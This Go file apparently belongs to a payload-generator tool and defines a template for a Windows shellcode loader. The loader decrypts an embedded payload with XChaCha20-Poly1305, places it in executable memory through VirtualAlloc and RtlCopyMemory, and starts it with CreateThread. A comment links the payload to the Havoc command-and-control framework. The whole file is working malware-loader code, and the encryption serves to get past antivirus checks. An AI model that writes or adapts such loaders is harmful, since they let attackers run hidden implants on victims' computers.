package templates

var ChaCha20Tmpl = `
package main

import (
	"fmt"
	"syscall"
	"unsafe"
	"errors"

	"golang.org/x/sys/windows"
	"golang.org/x/crypto/chacha20poly1305"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32 = windows.MustLoadDLL("kernel32.dll")
	ntdll    = windows.MustLoadDLL("ntdll.dll")

	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
	CreateThread  = kernel32.MustFindProc("CreateThread")
)

var ErrCipherTextTooShort = errors.New("ciphertext too short")

func decrypt(content, key []byte) ([]byte, error) {
	aead, err := chacha20poly1305.NewX(key)
	if err != nil {
		return nil, err
	}

	nonceSize := aead.NonceSize()
	if len(content) < nonceSize {
		return nil, ErrCipherTextTooShort
	}

	nonce, ciphertext := content[:nonceSize], content[nonceSize:]

	return aead.Open(nil, nonce, ciphertext, nil)
}

func main() {

	key := "{{ key }}"

	// Payload havoc
	var shellcodeBytes = []byte{
		{{ shellcode }}
	}

	var shellcode []byte
	shellcode, err := decrypt(shellcodeBytes, []byte(key))
	if err != nil {
		fmt.Println("failed to decrypt payload")
		fmt.Println(err)
		syscall.Exit(0)	
	}

	addr, _, err := VirtualAlloc.Call(
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE,
	)

	// retour d'erreur ( quand on appel la lib )
	// TODO improve error checking
	if err != nil && err.Error() != "L’opération a réussi." {
		fmt.Println("failed to alloc memory")
		fmt.Println(err)
		syscall.Exit(0)
	}

	_, _, err = RtlCopyMemory.Call(
		addr,
		(uintptr)(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
	)

	// TODO improve error checking
	if err != nil && err.Error() != "L’opération a réussi." {
		fmt.Println("failed to copy in memory")
		fmt.Println(err)
		syscall.Exit(0)
	}

	// jump to shellcode
	_, _, err = CreateThread.Call(
		0,    // [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
		0,    // [in]            SIZE_T                  dwStackSize,
		addr, // shellcode address
		0,    // [in, optional]  __drv_aliasesMem LPVOID lpParameter,
		0,    // [in]            DWORD                   dwCreationFlags,
		0,    // [out, optional] LPDWORD                 lpThreadId
	)

	// TODO improve error checking
	if err != nil && err.Error() != "L’opération a réussi." {
		fmt.Println("failed to create thread")
		fmt.Println(err)
	}

	for {
	}
}
`
